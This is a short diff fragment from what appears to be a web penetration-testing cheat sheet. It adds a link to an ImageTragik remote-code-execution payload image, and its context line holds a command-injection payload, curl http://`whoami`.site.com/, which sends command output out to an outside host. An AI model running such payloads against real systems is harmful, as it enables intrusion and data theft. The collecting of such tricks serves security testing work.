@@ -820,6 +820,8 @@ curl http://`whoami`.site.com/
 ### ImageTragik
 
 codes/rce/tragik.jpg
+  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
 
 ### Search across a half million git repos
   
